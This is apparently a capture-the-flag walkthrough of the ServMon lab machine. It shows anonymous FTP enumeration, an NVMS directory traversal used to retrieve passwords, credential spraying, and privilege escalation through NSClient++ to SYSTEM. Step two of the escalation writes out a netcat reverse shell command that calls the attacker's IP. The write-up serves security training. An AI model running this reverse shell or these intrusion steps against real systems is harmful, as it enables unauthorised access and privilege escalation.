# PORT SCAN
* **21** &#8594; FTP (anonymous login)
* **22** &#8594; SSH
* **80** &#8594; HTTP
* **135** &#8594; Microsoft RPC
* **139** &#8594; SMB (signing enabled but not required)
* **445** &#8594; SMB (secure, signing enabled but not required)
* **5666** &#8594; NRPE (Apparently)
* **6063** &#8594; X11
* **6699** &#8594; Napster (LOL, actaully we can see this port as a standard p2p port until new information)
* **8443** &#8594; HTTPS (tipically used by TomCat, title NSClient+)

<br><br><br>

# ENUMERATION & USER FLAG
Cool really exahustive port scan right here, this time I decide to google the box name and (after some walkthroughs) I have found [this tool on github](https://github.com/SeinopSys/ServMon) which is a sort of costum XAMPP Control Panel. I don't know if is used or not in the box (also exist at least another software with this name) but good to know.

By the way let's start from FTP since accept anonymous loging, inside we have a directory called `Users` with inside 2 subfolders with user name

![28e05d479c1c4aa916a0503a823bff64.png](img/28e05d479c1c4aa916a0503a823bff64.png)

Time to download the directory locally and check what we have here

![b8e4b7e9be59a73f5648755ec1692521.png](img/b8e4b7e9be59a73f5648755ec1692521.png)

Cool cool cool, in both we have the `.listing` file

![2ac9c89f4aea15f05ca978b760219c20.png](img/2ac9c89f4aea15f05ca978b760219c20.png)

Uhm.....ok(?) now is the Nadine `Confidential.txt` file

![88f6ab5c09c9cd0eea3c8183e90e5cc7.png](img/88f6ab5c09c9cd0eea3c8183e90e5cc7.png)

Ok now (just by intuition) if that file is still inside the Desktop of Nathan we can use `X11` protocol to access it and take Nadine password so let's take this option open,

Finally I can check the `TODO list` of Nathan

![e7136833787aa45c895c531508dc1d7b.png](img/e7136833787aa45c895c531508dc1d7b.png)

NVMS is not something known to me but can be or a CMS or a software for take a look at cameras but I fund no precise software/protocol so unless further enumeration doesn't give me enough info I will go on and hope on future informations. The fact that **secrets files are not uploaded on sharepoint** can mean they are locally on the box so good thing and **upload the passwords is unchecked** so on the Nathan Desktop we will found the password file but we need access now so time to check others port.

Port 80 uncover the NVMS enigma

![7a4bfaa06bfe55f49dfe53947e3a62ac.png](img/7a4bfaa06bfe55f49dfe53947e3a62ac.png)


Yeah, is a CCTV software and appear to be vulnerable to directory traversal

![ee367a1f3df61fe7db8ea61534d38f83.png](img/ee367a1f3df61fe7db8ea61534d38f83.png)

![efaf72524ec2d148a91169401e869697.png](img/efaf72524ec2d148a91169401e869697.png)

I tried and it works! After some trials I quickly retrieved the password file left on the Nathan Desktop

![90926a03e7218764b260055aea3ccc13.png](img/90926a03e7218764b260055aea3ccc13.png)

What happen when we have a list of user and a list of passwrods? **<u>CRACKMAPEXEC!</u>**

![db8144419ae75d9e9626310c2fe3e4d0.png](img/db8144419ae75d9e9626310c2fe3e4d0.png)

This tool is always satisfying when get the right credentials so we can use SSH (smb have nothing for us) and grab the user flag!

![ac9e383f32d937071c8a67b22fa0ca1d.png](img/ac9e383f32d937071c8a67b22fa0ca1d.png)

<br><br><br>

# PRIVILEGE ESCALATION
We are in and I have enough experience to know that one of the first thing to check on a WIndows environment are the application that can be found on `Program Files` and check if something new is available for us...

![575f451007a1691128a14164e9271c04.png](img/575f451007a1691128a14164e9271c04.png)

`NSClient++` is weird to have there and is described as **an agent designed originally to work with <u>Nagios</u> evolved into a fully fledged monitoring agent which can be used with numerous monitoring tools**. <u>Nagios</u> (which run on NRPE service identify before from the nmap scan) is used to monitor (remotely in this case) machine metrics.

The puzzle is slowly starting to be clear step by step, let's see what we inside the software directory but nothing cool.
We can use the CLI version of the software called `nscp` so first thing first is the version which is `0.5.2.35` and seems to be vulnerable to a known CVE 

![b0e6df5fbd8e997447b3a47243342354.png](img/b0e6df5fbd8e997447b3a47243342354.png)

COOL STUFF, COOL STUFF but someone can tell me why everyone can grab the password with this

![7ffe5d0dc001b6e35cbf3ce17d050823.png](img/7ffe5d0dc001b6e35cbf3ce17d050823.png)

LOL, now just follow the instructions to get the root 

1) We need to enable `CheckExternalScripts` and `Scheduler`, in order to achieve this we need to make a port forwarding (I get this because we can't remotely access it) but is not strictly needed because checking the configuration files this 2 configuration are activated from the start
2)  Upload `nc.exe` and a bat file like the following `\programdata\nc.exe 10.10.14.11 1234 -e cmd` (in my case everything in `programdata` directory)
3)  Now the hard part, we need to access the webapp and setting everythin in order to trigger the script. Why this is the hard part? Becausethe reverse port is glitchy as fuck...but with some patience we can login and we have the full interface

![901c28927c6f60826a1486819361eb54.png](img/901c28927c6f60826a1486819361eb54.png)

So we add an external script

![c5a3e0f0095aecf16e01c97578827df7.png](img/c5a3e0f0095aecf16e01c97578827df7.png)

And a scheduler

![26a1e947f5bf4804d8892d4d6c70dd3a.png](img/26a1e947f5bf4804d8892d4d6c70dd3a.png)

After some minutes we should have a reverse shell but not, why that? because defender is continously deleting the `nc.exe` file, annoying. So change of plans!

Let's use [this vulnerability](https://www.exploit-db.com/exploits/48360) wich is a RCE in order to add the user nandine to the administrators group. After downloding that and converting in python we can give thepassword and the url target (the one achieved with port forwarding) in order to get the RCE

![3e4431068415231b20cbac704df0deec.png](img/3e4431068415231b20cbac704df0deec.png)

Now let's check if everything was smooth

![f0f8cb7c68679fafcc7b7c9e9644f540.png](img/f0f8cb7c68679fafcc7b7c9e9644f540.png)

We are not done we need to make a PE on the PE (lol) in order to get `nt authority / system` and we can use PSEXEC for that. If we are part of administrators group we can abuse psexec which upload and start a Windows Service through SMB spawning a shell as `system` (more info [here](https://www.synacktiv.com/en/publications/traces-of-windows-remote-command-execution.html))

![8f9fe5cd09019001952bfc42a3498230.png](img/8f9fe5cd09019001952bfc42a3498230.png)

Good even if is a easy machine I have dealing with was a good training field for Windows skills!
